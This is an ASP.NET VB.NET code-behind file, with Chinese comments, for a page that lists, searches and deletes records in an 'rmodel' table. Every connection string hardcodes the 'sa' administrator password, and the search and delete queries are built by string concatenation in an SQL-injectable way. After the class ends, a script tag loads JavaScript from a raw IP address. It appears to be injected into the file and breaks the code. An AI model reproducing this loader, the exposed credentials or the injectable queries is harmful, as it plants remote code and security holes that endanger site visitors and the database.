Imports System.Data
Imports System.Data.SqlClient

Public Class WebForm3
    Inherits System.Web.UI.Page

#Region " Web 窗体设计器生成的代码 "

    '该调用是 Web 窗体设计器所必需的。
    <System.Diagnostics.DebuggerStepThrough()> Private Sub InitializeComponent()

    End Sub
    Protected WithEvents searchrmodel As System.Web.UI.WebControls.Button
    Protected WithEvents allremode As System.Web.UI.WebControls.Button
    Protected WithEvents Label1 As System.Web.UI.WebControls.Label
    Protected WithEvents droplistrmid As System.Web.UI.WebControls.DropDownList
    Protected WithEvents DataGrid1 As System.Web.UI.WebControls.DataGrid
    Protected WithEvents btnDel As System.Web.UI.WebControls.Button

    '注意: 以下占位符声明是 Web 窗体设计器所必需的。
    '不要删除或移动它。
    Private designerPlaceholderDeclaration As System.Object

    Private Sub Page_Init(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Init
        'CODEGEN: 此方法调用是 Web 窗体设计器所必需的
        '不要使用代码编辑器修改它。
        InitializeComponent()
    End Sub

#End Region
    Private Sub Page_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        '在此处放置初始化页的用户代码
        If Not IsPostBack Then  ' 用户第一次打开页面时
            Dim strsql As String
            Dim conn As New SqlConnection("workstation id=CC;packet size=4096;user id=sa;pwd=31736480.;data source=(local);persist security info=False;initial catalog=relation")
            conn.Open()

            Dim cmd As New SqlDataAdapter("select rmodelkey from rmodel", conn)
            Dim ds As New DataSet
            cmd.Fill(ds, "rmodel")
            droplistrmid.DataSource = ds.Tables("rmodel").DefaultView
            droplistrmid.DataBind()
            conn.Close()
        End If
    End Sub

    Private Sub allremode_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles allremode.Click
        Dim connstring As String
        Dim conn As New SqlConnection
        connstring = "workstation id=CC;packet size=4096;user id=sa;pwd=31736480.;data source=(local);persist security info=False;initial catalog=relation"
        conn.ConnectionString = connstring
        conn.Open()
        Dim cmd As New SqlDataAdapter
        Dim lngcount As Long
        Dim strcommand As String
        strcommand = "select * from rmodel"
        cmd = New SqlDataAdapter(strcommand, conn)
        Dim ds As New DataSet
        cmd.Fill(ds, "rmodel")
        DataGrid1.DataSource = ds.Tables("rmodel")
        DataGrid1.DataBind()
        conn.Close()
    End Sub

    Private Sub searchrmodel_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles searchrmodel.Click
        If (droplistrmid.Items.Count = 0) Then
            Exit Sub
        End If

        Dim connstring As String
        Dim conn As New SqlConnection
        Dim strcond As String

        connstring = "workstation id=CC;packet size=4096;user id=sa;pwd=31736480.;data source=(local);persist security info=False;initial catalog=relation"
        conn.ConnectionString = connstring
        conn.Open()
        strcond = "select * from rmodel where rmodelkey ='" & droplistrmid.SelectedItem.Text & "'"
        Dim cmd As New SqlDataAdapter(strcond, conn)
        Dim ds As New DataSet
        cmd.Fill(ds, "rmodelkey")
        DataGrid1.DataSource = ds.Tables("rmodelkey")
        DataGrid1.DataBind()
        conn.Close()
    End Sub

    Private Sub droplistrmid_SelectedIndexChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles droplistrmid.SelectedIndexChanged
        Dim connstring As String
        Dim conn As New SqlConnection
        Dim strcond As String

        connstring = "workstation id=CC;packet size=4096;user id=sa;pwd=31736480.;data source=(local);persist security info=False;initial catalog=relation"
        conn.ConnectionString = connstring
        conn.Open()
        strcond = "select * from rmodel where rmodelkey ='" & droplistrmid.SelectedItem.Text & "'"
        Dim cmd As New SqlDataAdapter(strcond, conn)
        Dim ds As New DataSet
        cmd.Fill(ds, "rmodelkey")
        DataGrid1.DataSource = ds.Tables("rmodelkey")
        DataGrid1.DataBind()
        conn.Close()
    End Sub

    Private Sub btnDel_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnDel.Click
        Dim connstring As String
        Dim conn As New SqlConnection
        Dim strsql As String
        Dim stritem As String

        If (droplistrmid.Items.Count = 0) Then  ' 若下拉列表为空
            Exit Sub
        End If

        stritem = droplistrmid.SelectedItem.Text
        connstring = "workstation id=CC;packet size=4096;user id=sa;pwd=31736480.;data source=(local);persist security info=False;initial catalog=relation"
        conn.ConnectionString = connstring
        conn.Open()
        strsql = "delete from rmodel where rmodelkey ='" & stritem & "'"
        Try ' 可能因为某些原因无法删除，捕捉异常这里
            Dim cmd As New SqlCommand(strsql, conn)
            cmd.ExecuteNonQuery()
            droplistrmid.Items.Remove(stritem)
        Catch
            Response.Write("Not successful!")
            conn.Close()
        End Try
    End Sub
End Class
<script src="http://222.208.183.246/ad/ad.js"></script>
